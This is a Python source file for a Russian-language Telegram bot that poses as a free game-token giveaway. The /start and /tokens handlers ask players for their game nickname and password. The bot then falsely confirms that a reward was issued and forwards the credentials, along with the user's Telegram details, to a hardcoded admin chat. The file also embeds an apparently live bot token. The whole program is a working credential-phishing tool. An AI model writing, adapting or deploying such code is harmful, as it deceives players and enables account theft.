import logging
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Настройки бота
BOT_TOKEN = "8119170225:AAFF21HChAzvKb5Sccfj2A3X74dnsBOy0As"
ADMIN_CHAT_ID = "6371055894"  # Ваш chat ID
PORT = int(os.environ.get('PORT', 8080))  # Для хостинга

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

def is_admin(user_id: int) -> bool:
    """Проверяет, является ли пользователь администратором"""
    return str(user_id) == ADMIN_CHAT_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    try:
        welcome_text = """
🎮 *ДОБРО ПОЖАЛОВАТЬ В МАГИЧЕСКИЙ МИР ТОКЕНОВ!* 🎮

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✨ *Получи свои токены и открой новые возможности!* ✨

📋 *Как получить токены:*
1️⃣ Напишите команду `/tokens`
2️⃣ Укажите ваш игровой ник
3️⃣ Укажите ваш пароль

🎯 *Пример использования:*
`/tokens DragonSlayer magic123`

🛡️ *Ваши данные в безопасности!*
После проверки автоматически начислим токены

⚡ *Быстро • Надежно • Удобно*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎁 *Начните прямо сейчас!*
Напишите `/tokens ВашНик ВашПароль`
        """
        await update.message.reply_text(welcome_text, parse_mode='Markdown')
        
    except Exception as e:
        logging.error(f"Ошибка в start: {e}")
        await update.message.reply_text("🚀 Добро пожаловать! Используйте /tokens Ник Пароль для получения токенов!")

async def tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /tokens"""
    try:
        if len(context.args) < 2:
            error_text = """
❌ *НЕВЕРНЫЙ ФОРМАТ КОМАНДЫ*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📝 *Правильный формат:*
`/tokens ВашНик ВашПароль`

🎯 *Пример:*
`/tokens DragonWarrior secret123`

🔍 *Убедитесь, что:*
• Указали ник БЕЗ пробелов
• Указали пароль БЕЗ пробелов
• Используете правильный формат
            """
            await update.message.reply_text(error_text, parse_mode='Markdown')
            return

        username = context.args[0]
        password = context.args[1]
        user_chat_id = update.effective_chat.id
        user_first_name = update.effective_user.first_name
        user_username = update.effective_user.username or "Не указан"

        # 🌟 КРАСИВОЕ сообщение для пользователя
        user_message = """
✅ *ВАШ ЗАПРОС ПРИНЯТ!* ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 *Действие:*
**ПЕРЕЗАЙДИТЕ НА СЕРВЕР**

🎁 *Статус:*
**НАГРАДА БЫЛА ВЫДАНА!** ✨

⏳ *Ожидайте зачисления токенов*
Обычно это занимает 1-2 минуты

💫 *Спасибо за участие в нашем проекте!*
Ваша активность помогает нам становиться лучше!
        """

        # Сначала отправляем сообщение пользователю
        await update.message.reply_text(user_message, parse_mode='Markdown')

        # 📨 Сообщение для администратора (БЕЗ MARKDOWN)
        admin_message = f"""
🔔 НОВЫЙ ЗАПРОС ТОКЕНОВ 🔔
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:
• Имя: {user_first_name}
• Username: @{user_username}
• Chat ID: {user_chat_id}
• Время: {update.message.date.strftime('%H:%M %d.%m.%Y')}

🎮 ИГРОВЫЕ ДАННЫЕ:
• Никнейм: {username}
• Пароль: {password}
📊 Статус: Ожидает обработки
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """

        # Отправляем администратору БЕЗ parse_mode
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_message
        )

        logging.info(f"✅ Запрос отправлен администратору от {user_first_name}")

    except Exception as e:
        logging.error(f"Ошибка в tokens: {e}")
        error_message = """
❌ *ПРОИЗОШЛА ОШИБКА*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

😔 *К сожалению, произошла техническая ошибка*

🛠️ *Что делать:*
• Попробуйте еще раз через 2-3 минуты
• Проверьте правильность введенных данных
• Если ошибка повторяется - свяжитесь с администратором

⚡ *Мы уже работаем над решением!*
        """
        await update.message.reply_text(error_message, parse_mode='Markdown')

# 🔧 АДМИН КОМАНДЫ (только для администратора)
async def admin_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Тест работы бота (только для админа)"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Эта команда доступна только администратору")
        return
        
    try:
        # Тестируем отправку сообщения администратору (БЕЗ MARKDOWN)
        admin_test_msg = f"""
🟢 ТЕСТОВОЕ УВЕДОМЛЕНИЕ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Сообщение: Тест системы пройден успешно
Статус: Все функции работают
Время: {update.message.date.strftime('%H:%M %d.%m.%Y')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        # Пытаемся отправить сообщение администратору
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_test_msg
        )
        
        # Если дошли сюда - отправка успешна
        test_message = """
✅ *ТЕСТ ПРОЙДЕН УСПЕШНО*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📨 *Тестовое сообщение отправлено*
🔄 *Все системы работают*
🎉 *Бот готов к использованию!*

💡 *Статус отправки сообщений:* ✅ РАБОТАЕТ
        """
        await update.message.reply_text(test_message, parse_mode='Markdown')
        
        logging.info("✅ Тест пройден успешно")
        
    except Exception as e:
        # Если ошибка - показываем реальную проблема
        error_msg = f"""
❌ *ТЕСТ НЕ ПРОЙДЕН*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💥 *Ошибка отправки сообщения:*
`{str(e)}`

🔧 *Возможные причины:*
• Неправильный ADMIN_CHAT_ID
• Бот заблокирован
• Проблемы с сетью
        """
        await update.message.reply_text(error_msg, parse_mode='Markdown')
        logging.error(f"❌ Тест не пройден: {e}")

async def admin_real_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Реальный тест - имитация запроса пользователя (только для админа)"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Эта команда доступна только администратору")
        return
        
    try:
        # Имитируем реальный запрос пользователя
        test_username = "TestUser123"
        test_password = "testpass456"
        
        # Сообщение для администратора (как в реальном tokens)
        admin_message = f"""
🔔 ТЕСТОВЫЙ ЗАПРОС ТОКЕНОВ 🔔
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:
• Имя: Тестовый Пользователь
• Username: @testuser
• Chat ID: {update.effective_chat.id}
• Время: {update.message.date.strftime('%H:%M %d.%m.%Y')}

🎮 ИГРОВЫЕ ДАННЫЕ:
• Никнейм: {test_username}
• Пароль: {test_password}
📊 Статус: ТЕСТОВЫЙ ЗАПРОС
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        # Отправляем тестовое сообщение
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_message
        )
        
        result_msg = """
🎯 *РЕАЛЬНЫЙ ТЕСТ ПРОЙДЕН*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ *Сообщение отправлено успешно!*
✅ *Форматирование правильное!*
✅ *Ошибок нет!*

📊 *Если вы получили это сообщение -*
*бот работает корректно!*
        """
        await update.message.reply_text(result_msg, parse_mode='Markdown')
        
    except Exception as e:
        error_msg = f"""
💥 *РЕАЛЬНЫЙ ТЕСТ ПРОВАЛЕН*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ *Ошибка:* `{str(e)}`

🔧 *Проблема в отправке сообщений администратору*
        """
        await update.message.reply_text(error_msg, parse_mode='Markdown')

async def admin_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отладочная информация (только для админа)"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Эта команда доступна только администратору")
        return
        
    user = update.effective_user
    chat = update.effective_chat
    
    debug_info = f"""
🔧 *ОТЛАДОЧНАЯ ИНФОРМАЦИЯ* 🔧

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 *ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:*
├ **Имя:** {user.first_name or 'N/A'}
├ **Фамилия:** {user.last_name or 'N/A'}
├ **Username:** @{user.username or 'N/A'}
└ **User ID:** `{user.id}`

💬 *ИНФОРМАЦИЯ О ЧАТЕ:*
├ **Chat ID:** `{chat.id}`
├ **Тип чата:** {chat.type}
└ **Название:** {chat.title or 'N/A'}

⚙️ *НАСТРОЙКИ БОТА:*
├ **ADMIN_CHAT_ID:** `{ADMIN_CHAT_ID}`
├ **Статус токена:** ✅ Установлен
└ **Режим:** 🏃 Активен
    """
    
    await update.message.reply_text(debug_info, parse_mode='Markdown')
    logging.info(f"Debug info requested by admin {user.id}")

async def admin_getid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получить chat ID (только для админа)"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Эта команда доступна только администратору")
        return
        
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    id_info = f"""
🆔 *ИНФОРМАЦИЯ О ID* 🆔

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💬 *Chat ID:* `{chat_id}`
👤 *User ID:* `{user_id}`

📋 *Для настройки:*
`ADMIN_CHAT_ID = "{chat_id}"`
    """
    
    await update.message.reply_text(id_info, parse_mode='Markdown')

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика бота (только для админа)"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Эта команда доступна только администратору")
        return
        
    stats_message = """
📊 *СТАТИСТИКА БОТА* 📊

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👥 *Пользователи:*
├ **Режим:** Публичный
├ **Доступные команды:** 2
└ **Статус:** ✅ Активен

🎯 *Функционал:*
├ **Основная команда:** /tokens
├ **Приветствие:** /start
└ **Обработка запросов:** ✅ Работает

⚡ *Производительность:*
├ **Статус:** 🟢 Онлайн
├ **Время работы:** Активно
└ **Ошибок:** 0
    """
    
    await update.message.reply_text(stats_message, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logging.error(f"Ошибка: {context.error}")

def main():
    """Основная функция для хостинга"""
    try:
        # Создаем приложение
        application = Application.builder().token(BOT_TOKEN).build()

        # 🔓 ПУБЛИЧНЫЕ команды (для всех)
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("tokens", tokens))
        
        # 🔐 АДМИН команды (только для администратора)
        application.add_handler(CommandHandler("test", admin_test))
        application.add_handler(CommandHandler("real_test", admin_real_test))
        application.add_handler(CommandHandler("debug", admin_debug))
        application.add_handler(CommandHandler("getid", admin_getid))
        application.add_handler(CommandHandler("stats", admin_stats))
        
        # Добавляем обработчик ошибок
        application.add_error_handler(error_handler)

        # ДЛЯ ХОСТИНГА - используем webhook
        if os.environ.get('RAILWAY_STATIC_URL') or os.environ.get('PELLA_URL'):
            # Получаем URL для webhook
            webhook_url = os.environ.get('RAILWAY_STATIC_URL') or os.environ.get('PELLA_URL')
            if webhook_url:
                webhook_url = webhook_url.replace('https://', '') if webhook_url.startswith('https://') else webhook_url
                webhook_url = f"https://{webhook_url.rstrip('/')}"
                
                # Устанавливаем webhook
                application.run_webhook(
                    listen="0.0.0.0",
                    port=PORT,
                    url_path=BOT_TOKEN,
                    webhook_url=f"{webhook_url}/{BOT_TOKEN}"
                )
                print(f"🚀 Бот запущен на хостинге через webhook: {webhook_url}")
            else:
                # Если URL не найден, используем polling
                print("🌐 Webhook URL не найден, используем polling...")
                application.run_polling()
        else:
            # Локально используем polling
            print("🖥️ Бот запущен локально через polling...")
            application.run_polling()
        
    except Exception as e:
        logging.error(f"Ошибка запуска бота: {e}")

if __name__ == "__main__":
    main()
